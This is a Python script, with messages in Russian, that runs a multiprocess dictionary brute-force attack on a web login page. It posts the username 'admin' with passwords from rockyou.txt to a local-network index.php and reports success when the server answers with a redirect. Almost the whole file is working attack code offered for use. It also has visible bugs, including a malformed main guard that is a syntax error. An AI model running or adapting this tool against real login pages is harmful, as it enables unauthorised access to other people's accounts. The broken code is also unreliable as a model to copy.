import requests
import time
from multiprocessing import Process, Manager, Value, Lock

class BruteForceAttack:
    def __init__(self, auth_url, passwords_file, admin_username, num_processes=4, batch_size=100000):
        self.auth_url = auth_url
        self.passwords_file = passwords_file
        self.admin_username = admin_username
        self.num_processes = num_processes
        self.batch_size = batch_size
        self.stop_event = Value('b', False)
        self.found_password = Manager().dict()
        self.lock = Lock() 

    def check_password(self, password):
        if self.stop_event.value:
            return

        password = password.strip()
        payload = {
            "username": self.admin_username,
            "password": password
        }

        try:
            response = requests.post(self.auth_url, data=payload, allow_redirects=False)

            if response.status_code == 302:
                with self.lock:
                    if not self.stop_event.value:
                        print(f"[+] Успешно! Найден пароль: {password}")
                        print(f"[*] Редирект на страницу: {response.headers['Location']}")
                        self.found_password["password"] = password
                        self.stop_event.value = True
            elif "CSRF" in response.text or "csrf" in response.text:
                with self.lock:
                    if not self.stop_event.value:
                        print("[-] Обнаружен CSRF-токен. Атака невозможна.")
                        self.stop_event.value = True
            else:
                print(f"[*] Попытка с паролем: {password}")
        except Exception as e:
            print(f"Ошибка при отправке запроса: {e}")

    def process_worker(self, passwords_chunk):
        for password in passwords_chunk:
            if self.stop_event.value:
                break
            self.check_password(password)

    def run(self):
        print("[*] Запуск атаки методом подбора паролей...")
        start_time = time.time()

        try:
            with open(self.passwords_file, "r", encoding="latin-1") as file:
                while True:
                    if self.stop_event.value:
                        break

                    passwords = [file.readline().strip() for _ in range(self.batch_size)]
                    passwords = [p for p in passwords if p]
                    if not passwords:
                        break

                    print(f"[*] Обработка батча размером {len(passwords)} паролей...")

                    chunk_size = len(passwords) // self.num_processes
                    chunks = [passwords[i * chunk_size:(i + 1) * chunk_size] for i in range(self.num_processes)]

                    processes = []
                    for i in range(self.num_processes):
                        p = Process(target=self.process_worker, args=(chunks[i],))
                        processes.append(p)
                        p.start()

                    for p in processes:
                        p.join()

        except FileNotFoundError:
            print(f"[-] Файл со словарем паролей не найден: {self.passwords_file}")
            return

        end_time = time.time()
        elapsed_time = end_time - start_time

        if self.stop_event.value:
            print(f"[+] Атака завершена успешно за {elapsed_time:.2f} секунд.")
            print(f"[+] Найденный пароль: {self.found_password.get('password', 'Неизвестно')}")
        else:
            print(f"[-] Атака завершена без успеха за {elapsed_time:.2f} секунд.")


if __name__ = "main":
    AUTH_URL = "http://192.168.0.12/index.php"
    PASSWORDS_FILE = "rockyou.txt"
    ADMIN_USERNAME = "admin"
    
    brute_force = BruteForceAttack(AUTH_URL, PASSWORDS_FILE, ADMIN_USERNAME, num_processes=8, batch_size=100000)
    brute_force.run()
